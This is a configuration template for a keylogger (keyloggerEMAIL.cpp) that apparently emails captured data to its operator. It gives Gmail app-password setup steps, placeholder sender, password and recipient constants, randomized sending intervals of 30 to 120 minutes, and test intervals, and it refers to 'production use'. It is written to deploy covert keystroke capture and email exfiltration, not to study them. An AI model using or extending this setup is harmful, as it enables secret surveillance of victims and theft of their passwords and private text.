# Email Configuration Template
# Copy this file and rename to config.cpp or modify keyloggerEMAIL.cpp directly

## Gmail Setup Instructions:
1. Enable 2-Factor Authentication on your Gmail account
2. Go to Google Account Settings > Security > App passwords
3. Generate an app password for "Mail"
4. Use the 16-character password below

## Configuration:
```cpp
const std::string EMAIL_FROM = "your_sender_email@gmail.com";
const std::string EMAIL_PASSWORD = "abcd efgh ijkl mnop";  // 16-character app password
const std::string EMAIL_TO = "your_recipient@gmail.com";
```

## Timing Settings:
- EMAIL_INTERVAL_MIN_MINUTES: Minimum time between emails (30 recommended)
- EMAIL_INTERVAL_MAX_MINUTES: Maximum time between emails (120 recommended)

## Security Notes:
- Never commit real credentials to version control
- Use unique app passwords for each application
- Regularly rotate passwords
- Monitor email activity for suspicious behavior

## Testing:
Start with shorter intervals for testing:
```cpp
const int EMAIL_INTERVAL_MIN_MINUTES = 1;   // For testing only
const int EMAIL_INTERVAL_MAX_MINUTES = 2;   // For testing only
```

Remember to change back to longer intervals for production use!
